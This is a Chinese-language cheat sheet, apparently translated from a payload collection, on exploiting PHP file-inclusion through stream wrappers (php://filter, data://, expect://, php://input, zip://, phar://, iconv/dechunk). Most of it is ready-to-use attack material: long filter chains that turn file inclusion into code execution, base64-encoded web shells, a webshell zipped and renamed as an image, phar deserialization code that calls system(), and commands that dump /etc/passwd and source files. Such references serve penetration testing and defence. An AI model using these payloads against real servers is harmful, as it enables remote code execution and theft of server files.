# 使用包装器进行包含

在文件包含漏洞的上下文中，“包装器”指的是用于访问或包含文件的协议或方法。包装器通常用于PHP或其他服务器端语言中，以扩展文件包含功能，除了本地文件系统外，还可以使用HTTP、FTP等协议。

## 概述

- [包装器 php://filter](#包装器-phpfilter)
- [包装器 data://](#包装器-data)
- [包装器 expect://](#包装器-expect)
- [包装器 input://](#包装器-input)
- [包装器 zip://](#包装器-zip)
- [包装器 phar://](#包装器-phar)
    - [PHAR 归档结构](#phar-归档结构)
    - [PHAR 反序列化](#phar-反序列化)
- [包装器 convert.iconv:// 和 dechunk://](#包装器-converticonv-和-dechunk)
    - [从基于错误的oracle泄露文件内容](#从基于错误的oracle泄露文件内容)
    - [在自定义格式输出中泄露文件内容](#在自定义格式输出中泄露文件内容)
- [参考文献](#参考文献)

## 包装器 php://filter

部分 "`php://filter`" 是不区分大小写的。

| 过滤器           | 描述                     |
| ---------------- | ------------------------ |
| `php://filter/read=string.rot13/resource=index.php` | 将 index.php 显示为 rot13 |
| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | 将 index.php 从 utf8 编码为 utf16 |
| `php://filter/convert.base64-encode/resource=index.php` | 将 index.php 显示为 base64 编码字符串 |

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

对于大文件，可以使用压缩包装器链接包装器。

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

注意：包装器可以通过 `|` 或 `/` 多次链接：

- 多次 base64 解码：`php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- 先压缩再 base64 编码（适用于有限字符提取）：`php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

此外，还可以将 `php://filter` 转换为完整的 RCE。

- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - 生成 PHP 过滤器链的命令行工具

  ```powershell
  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
  [+] 将生成以下代码：<?php phpinfo();?> （base64 值: PD9waHAgcGhwaW5mbygpOz8+）
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2.LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2.LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2.LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd
  ```

- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) 用于生成自定义的有效载荷。

  ```powershell
  # 漏洞文件: index.php
  # 漏洞参数: file
  # 执行命令: id
  # 执行 PHP 代码: <?=`$_GET[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd
  ```

## 包装器 data://

编码为 base64 的有效载荷是 "`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`"。

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

有趣的是，你可以通过以下方式触发 XSS 并绕过 Chrome 审核器：`http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

## 包装器 expect://

当在 PHP 或类似的应用程序中使用时，它可能允许攻击者指定要在系统 shell 中执行的命令，因为 `expect://` 包装器可以作为其输入的一部分调用 shell 命令。

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

## 包装器 input://

在 POST 参数中指定你的有效载荷，这可以通过简单的 `curl` 命令完成。

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

或者，Kadimus 有一个模块可以自动化此攻击。

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

## 包装器 zip://

- 创建一个恶意有效载荷：`echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
- 压缩文件

  ```python
  zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
  ```

- 上传存档并使用包装器访问文件：

  ```ps1
  http://example.com/index.php?page=zip://shell.jpg%23payload.php
  ```

## 包装器 phar://

### PHAR 归档结构

PHAR 文件的工作原理类似于 ZIP 文件，当你使用 `phar://` 来访问其中存储的文件时。

- 创建包含后门文件的 phar 存档：`php --define phar.readonly=0 archive.php`

  ```php
  <?php
    $phar = new Phar('archive.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
  ?>
  ```

- 使用 `phar://` 包装器：`curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`

### PHAR 反序列化

:warning: 此技术在 PHP 8+ 上不起作用，反序列化已被移除。

如果现在通过 `phar://` 包装器对我们的现有 phar 文件执行文件操作，则会对其序列化的元数据进行反序列化。此漏洞发生在以下函数中，包括 `file_exists`：`include`、`file_get_contents`、`file_put_contents`、`copy`、`file_exists`、`is_executable`、`is_file`、`is_dir`、`is_link`、`is_writable`、`fileperms`、`fileinode`、`filesize`、`fileowner`、`filegroup`、`fileatime`、`filemtime`、`filectime`、`filetype`、`getimagesize`、`exif_read_data`、`stat`、`lstat`、`touch`、`md5_file` 等。

此漏洞需要至少有一个具有魔术方法的类，例如 `__destruct()` 或 `__wakeup()`。
让我们以这个 `AnyClass` 类为例，它执行参数数据。

```php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);
```

我们可以创建一个包含序列化对象的 phar 存档。

```php
// 创建新的 phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// 将任意类的对象添加为元数据
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

最后调用 phar 包装器：`curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`

注意：你可以使用 `$phar->setStub()` 添加 JPG 文件的魔术字节：`\xff\xd8\xff`

```php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```

## 包装器 convert.iconv:// 和 dechunk://

### 从基于错误的oracle泄露文件内容

- `convert.iconv://`：将输入转换为另一种编码（`convert.iconv.utf-16le.utf-8`）
- `dechunk://`：如果字符串不含换行符，则仅当字符串以 A-Fa-f0-9 开头时才会清除整个字符串

这种利用的目标是从文件中逐个字符地泄露内容，基于 [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py) 的写入。

**要求**：

- 后端不能使用 `file_exists` 或 `is_file`。
- 漏洞参数应在 `POST` 请求中。
    - 在 GET 请求中无法泄露超过 135 个字符，因为受到大小限制

利用链基于 PHP 过滤器：`iconv` 和 `dechunk`：

1. 使用 `iconv` 过滤器，以指数方式增加数据大小来触发内存错误。
2. 使用 `dechunk` 过滤器，根据之前的错误确定文件的第一个字符。
3. 再次使用 `iconv` 过滤器，使用具有不同字节顺序的编码来交换剩余字符与第一个字符。

使用 [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)，脚本将使用 `HTTP 状态码：500` 或时间作为基于错误的 oracle 来确定字符。

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] 目标 URL 为：http://127.0.0.1
[*] 泄露的本地文件为：/test
[*] 正在运行 POST 请求
[+] 文件 /test 泄露已完成！
```

### 在自定义格式输出中泄露文件内容

- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - 生成一个 `php://filter` 链，为文件内容添加前缀和后缀。

为了获得某些文件的内容，我们希望得到：`{"message":"<file contents>"}`。

```ps1
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

这可以针对以下易受攻击的代码使用。

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

### 使用盲文件读取原语泄露文件内容

- [ambionics/lightyear](https://github.com/ambionics/lightyear)

```ps1
code remote.py # 编辑 Remote.oracle
./lightyear.py test # 测试你的实现是否正常工作
./lightyear.py /etc/passwd # 导出文件！
```

## 参考文献

- [Baby^H Master PHP 2017 - Orange Tsai (@orangetw) - Dec 5, 2021](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
- [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - May 27, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
- [Introducing lightyear: a new way to dump PHP files - Charles Fol - November 4, 2024](https://www.ambionics.io/blog/lightyear-file-dump)
- [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - December 11, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
- [It's A PHP Unserialization Vulnerability Jim But Not As We Know It - Sam Thomas - August 10, 2018](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [New PHP Exploitation Technique - Dr. Johannes Dahse - August 14, 2018](https://web.archive.org/web/20180817103621/https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [OffensiveCon24 - Charles Fol- Iconv, Set the Charset to RCE - June 14, 2024](https://youtu.be/dqKFHjcK9hM)
- [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - March 21, 2023](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
- [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - October 18, 2022](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
- [Solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop - December 30, 2021](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)